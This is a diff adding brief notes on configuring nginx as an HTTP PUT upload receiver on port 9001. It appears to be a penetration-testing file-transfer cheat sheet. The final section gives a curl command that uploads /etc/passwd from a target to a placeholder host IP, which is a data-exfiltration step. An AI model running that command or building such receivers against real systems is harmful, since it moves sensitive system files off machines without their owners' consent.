@@ -1,0 +1,38 @@
+NGINX makes it easy to shoot ourselves in the foot because of the PHP handling.
+
+make a directory:
+sudo mkdir -p /var/www/uploads/<directory-name>
+
+change owner to www-data:
+sudo chown -R www-data:www-data /var/www/uploads/<directory-name>
+
+Create nginx config file in /etc/nginx/sites-available/upload.conf :
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+
+symlink our site to sites-enabled directory:
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+start up nginx:
+sudo systemctl restart nginx.service
+
+
+to check errors:
+tail -2 /var/log/nginx/error.log
+
+to remove nginx default config:
+sudo rm /etc/nginx/sites-enabled/default
+
+
+
+TO UPLOAD TO SERVER (from t to h):
+curl -T /etc/passwd http://<host-ip>:9001/<directory-name>/passwd
+
+
+might consider getting a certificate to use https instead of http.
